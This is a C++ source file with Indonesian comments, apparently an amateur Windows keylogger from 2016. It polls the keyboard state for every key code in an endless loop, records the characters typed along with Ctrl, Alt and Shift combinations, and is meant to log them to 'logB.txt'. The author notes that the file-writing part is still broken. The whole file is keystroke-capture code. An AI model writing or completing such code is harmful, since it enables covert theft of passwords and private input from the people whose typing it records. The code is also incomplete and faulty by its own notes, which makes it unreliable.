#include <iostream>
#include <windows.h>

/*
	PENJElASAN PENGGUNAAN SYSTEM CALLS WINDOWS API (WINAPI) YANG DIGUNAKAN
	
	Kedua fungsi dibawah memiliki parameter input
	
	GetAsyncKeyState(_In_ Code)
		API ini memberikan respon secara realtime (asinkronus) dari keadaan keyboard, misal ketika shift ditekan
		dan ditahan maka pemanggilan GetAsyncKeyState(VK_SHIFT) akan mengembalikan true namun
		ketika shift dilepas maka pemanggilan GetAsyncKeyState(VK_SHIFT) akan mngembalikan false.
		Sumber: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293%28v=vs.85%29.aspx
		
	GetKeyState(_In_ Code)
		API ini mirip dengan API diatas namun tidak realtime (asinkronus), misal ketika shift ditekan dan ditahan
		GetKeyState(VK_SHIFT) akan mengembalikan true dan ketika shift dilepas pemanggilan yang sama tetap menghasilkan
		true, namun ketika shift ditekan lagi maka pemanggilan GetKeyState(VK_SHIFT) mengembalikan true. Ini menunjukkan
		pemanggilan fungsi ini mirip tombol toggle (on/off). Ditekan sekali true ditekan lagi menjadi false, ditekan lagi
		menjadi true dan seterusnya.
		Sumber: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646301%28v=vs.85%29.aspx
		
*/

/*

	Issue sementara
		29 Januari 2016 22:05, "Penulisan ke file menggunakan string dataRekam masih bermasalah."
		29 Januari 2016 22:05, "fungsi olahKarakter belum mengembalikan karakter yang diinginkan --> belum diperbaiki, butuh perbaikan"

*/


using namespace std;

// tempat menyimpan semua data rekaman keyboard
string dataRekam = "";

// mengembalikan bentuk karakter dari keyCode Keyboard
char olahKarakter(int kode){
	return (char) kode;
}

// mengembalikan true jika i adalah representasi kode dari Shift, Ctrl, atau Alt
bool kunciKhusus(int i){
	return 
		// Shift kiri & kanan
		i == 160 || i == 161 || 
		
		// Ctrl kiri & kanan
		i == 162 || i == 163 || 
		
		// Alt kiri & kanan
		i == 164 || i == 165 || 
		
		// Shift kiri-kanan
		i == 16 || 
		
		// Ctrl kiri-kanan
		i == 17 || 
		
		// Alt kiri-kanan
		i == 18;
}

// mengolah masukan dengan keyCode in dan keadaan Shift, Ctrl, Alt, dan Capslock diberikan
void olahMasukan(int in, bool tCtrl, bool tAlt, bool tShift, bool tCapslock){
	
	string masukan = "";
	
	// Ctrl dan Alt ditekan
	if(tCtrl && tAlt){
		masukan += "(CTRL+ALT+";
	}else{
		
		// Hanya Ctrl yang ditekan
		if(tCtrl){
			masukan += "(CTRL+";
		}else{
			
			// Hanya Alt yang ditekan
			if(tAlt){
				masukan += "(ALT+";
			}
		}
	}
	
	// Mode Shift dan Capslock tidak aktif (huruf kecil)
	if(!(tCapslock ^ tShift) && in > 64 && in < 91){
		masukan += olahKarakter(in + 32);
	}else{
		
		// Mode Shift dan Capslock aktif (huruf kapital)
		masukan += olahKarakter(in);
	}
	masukan += (tCtrl || tAlt ? ")" : "");
	
	cout << masukan;
	
	// menyimpan keluaran ke dalam string dataRekam;
	dataRekam += masukan;
}

// mulai merekam masukan keyboard
void mulaiRekam(char *namaBerkas){
	
	FILE *file;
	
	// membuka berkas
	file = fopen(namaBerkas, "a+");
	
	// vkCode adalah variabel yang menyimpan keyCode yang diinput pengguna
	int vkCode = -1;
	
	// keyUp true artinya tombol yang baru ditekan dilepas
	bool keyUp = false;
	
	// Mengulang terus menerus
	while(1){
		
		bool terlepas = true;
		bool tombolShift = GetAsyncKeyState(16);
		bool tombolCtrl = GetAsyncKeyState(17);
		bool tombolAlt = GetAsyncKeyState(18);
		bool tombolCapslock = GetKeyState(VK_CAPITAL);
		
		// Perulangan kemungkinan semua keycode Windows API sebanyak 2 byte = 256 keycode
		for(int keyCode = 1; keyCode < 0xFF; keyCode++){
		
			// Pengguna menekan keyboard dengan mengabaikan tombol Shift, Ctrl, dan Alt
			if((GetKeyState(keyCode) & 0x8000) && !kunciKhusus(keyCode)){
				
				// tombol dilepas (keyup)		
				terlepas = false;
				
				// pengguna menekan tombol yang berbeda dari tombol sebelumnya
				if(keyCode != vkCode){
					
					vkCode = keyCode;
					olahMasukan(vkCode, tombolCtrl, tombolAlt, tombolShift, tombolCapslock);
				}else{
					
					// pengguna menekan tombol yang sama berulang
					if(keyUp){
						
						olahMasukan(vkCode, tombolCtrl, tombolAlt, tombolShift, tombolCapslock);
						keyUp = false;
					}
				}				
				break;
			}
		}
		
		keyUp = terlepas;
	}
	
	// menulis rekaman/log
	// fputs(dataRekam, file); <-- ga bisa ???
	
	// menutup berkas
	fclose(file);
	
}

int main(){
	
	// mulai merekam aktivitas keyboard
	mulaiRekam("logB.txt");
	
	return 0;
}
